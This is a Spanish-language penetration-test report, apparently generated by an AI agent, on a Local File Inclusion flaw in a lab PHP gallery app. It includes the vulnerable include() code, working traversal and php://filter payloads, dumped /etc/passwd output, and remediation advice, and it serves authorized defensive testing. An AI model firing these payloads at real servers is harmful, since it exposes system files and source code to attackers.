# Informe de Auditoría de Seguridad – Local File Inclusion (LFI)

**Objetivo:** http://web.dev.local:8081  
**Fecha:** 2026-04-30 15:44:24  
**Analista:** GitHub Copilot CLI (claude-sonnet-4.6)  
**Tipo de análisis:** Local File Inclusion (LFI)

---

## 1. Resumen Ejecutivo

Se identificó y explotó exitosamente una vulnerabilidad de **Local File Inclusion (LFI)** en la aplicación web "Galería de Arte Virtual". La vulnerabilidad permite a un atacante leer archivos arbitrarios del servidor mediante la manipulación del parámetro `page` en el endpoint `gallery.php`.

**Resultado:**
- **Vulnerabilidad encontrada:** ✅ Sí
- **Vulnerabilidad explotada:** ✅ Sí

---

## 2. Descripción de la Aplicación

La aplicación es una galería de arte virtual con las siguientes rutas identificadas:

| URL | Descripción |
|-----|-------------|
| `http://web.dev.local:8081/` | Página principal (index.php) |
| `http://web.dev.local:8081/gallery.php?page=modern` | Galería - Arte Moderno |
| `http://web.dev.local:8081/gallery.php?page=classic` | Galería - Arte Clásico |
| `http://web.dev.local:8081/gallery.php?page=abstract` | Galería - Arte Abstracto |
| `http://web.dev.local:8081/gallery.php?page=about` | Acerca de |

---

## 3. Vulnerabilidad Detectada: Local File Inclusion (LFI)

### 3.1 Descripción

**CVE relacionado:** CWE-98 (Improper Control of Filename for Include/Require Statement)  
**Severidad:** Alta (CVSS ~7.5)  
**Endpoint vulnerable:** `gallery.php`  
**Parámetro vulnerable:** `page`

La aplicación incluye archivos PHP dinámicamente basándose en el valor del parámetro `page` sin sanitización adecuada. El código fuente (obtenido vía PHP filter wrapper) revela la lógica vulnerable:

```php
<?php
$page = $_GET['page'] ?? 'modern';

// Check if the page parameter contains file extension
if (strpos($page, '.') !== false) {
    // If it has an extension, use it as-is 
    $file = $page;
} else {
    // Otherwise, assume it's a page in the pages directory
    $file = "pages/" . $page . ".php";
}

if (file_exists($file)) {
    include($file);
} else {
    echo "<div class='error'>";
    echo "<h3>Página no encontrada</h3>";
    echo "<p>El archivo solicitado no existe: " . htmlspecialchars($file) . "</p>";
    echo "</div>";
    // Try to include anyway
    @include($file);
}
?>
```

**Causa raíz:** La lógica detecta si el parámetro contiene un punto (`.`). Si lo contiene, usa el valor directamente como ruta de archivo para `include()`. Esto permite path traversal con secuencias `../` para salir del directorio web raíz.

### 3.2 Vector de Ataque

```
http://web.dev.local:8081/gallery.php?page=../../../etc/passwd
```

La secuencia `../../../` sube tres niveles desde el directorio web raíz hasta la raíz del sistema de archivos `/`, permitiendo leer cualquier archivo legible por el proceso del servidor web.

---

## 4. Explotación

### 4.1 Lectura de /etc/passwd

**Payload:**
```
GET /gallery.php?page=../../../etc/passwd HTTP/1.1
Host: web.dev.local:8081
```

**Resultado exitoso – contenido de `/etc/passwd`:**
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
```

### 4.2 Lectura del código fuente (PHP Filter Wrapper)

**Payload:**
```
GET /gallery.php?page=php://filter/convert.base64-encode/resource=gallery.php HTTP/1.1
```

El wrapper `php://filter` también fue explotado exitosamente para obtener el código fuente completo de `gallery.php` en base64, confirmando que no hay ningún filtro de wrappers PHP activo.

### 4.3 Otros archivos accesibles

| Archivo | Accesible | Resultado |
|---------|-----------|-----------|
| `/etc/passwd` | ✅ | Lectura completa |
| `php://filter/...gallery.php` | ✅ | Código fuente en base64 |
| `/etc/shadow` | ❌ | Sin permisos (www-data) |
| `/var/log/apache2/access.log` | ❌ | No encontrado |
| `/etc/hosts` | ⚠️ | Respuesta ambigua |

---

## 5. Impacto

| Categoría | Impacto |
|-----------|---------|
| **Confidencialidad** | Alto – Lectura de archivos del sistema y código fuente |
| **Integridad** | Bajo – No se detectó escritura de archivos |
| **Disponibilidad** | Bajo – No afecta directamente la disponibilidad |
| **Escalada potencial** | Alto – Si se combina con Log Poisoning, RFI u otros vectores podría escalar a RCE |

La exposición de `/etc/passwd` revela nombres de usuarios del sistema. La lectura del código fuente mediante PHP filter wrappers permite a un atacante mapear completamente la aplicación en busca de más vulnerabilidades.

---

## 6. Recomendaciones

1. **Validación estricta de entrada:** Usar una lista blanca (allowlist) de valores permitidos para el parámetro `page`:
   ```php
   $allowed_pages = ['modern', 'classic', 'abstract', 'about'];
   if (!in_array($page, $allowed_pages)) {
       die("Página no permitida");
   }
   $file = "pages/" . $page . ".php";
   ```

2. **Deshabilitar wrappers PHP peligrosos** en `php.ini`:
   ```ini
   allow_url_include = Off
   allow_url_fopen = Off
   ```

3. **Usar `realpath()` y verificar el directorio base:**
   ```php
   $base = realpath('./pages/');
   $file = realpath('./pages/' . $page . '.php');
   if (strpos($file, $base) !== 0) {
       die("Acceso no permitido");
   }
   ```

4. **Nunca usar `include()` con datos del usuario** directamente. Evaluar el uso de un sistema de plantillas (Twig, Blade) que aísle la lógica de plantillas del sistema de archivos.

5. **Principio de mínimo privilegio:** El proceso del servidor web debe ejecutarse con el usuario con menos permisos posibles y sin acceso de lectura a archivos del sistema fuera del directorio web.

6. **Auditoría de logs:** Implementar monitoreo de accesos con patrones sospechosos (`../`, `php://`, `file://`).

---

## 7. Conclusión

La aplicación "Galería de Arte Virtual" presenta una vulnerabilidad crítica de LFI en `gallery.php` por falta de validación del parámetro `page`. Esta vulnerabilidad fue confirmada y explotada exitosamente, logrando la lectura de archivos sensibles del sistema operativo (`/etc/passwd`) y del código fuente de la aplicación. Se recomienda aplicar las correcciones indicadas con carácter urgente.

---

*Informe generado automáticamente por análisis de seguridad autorizado.*
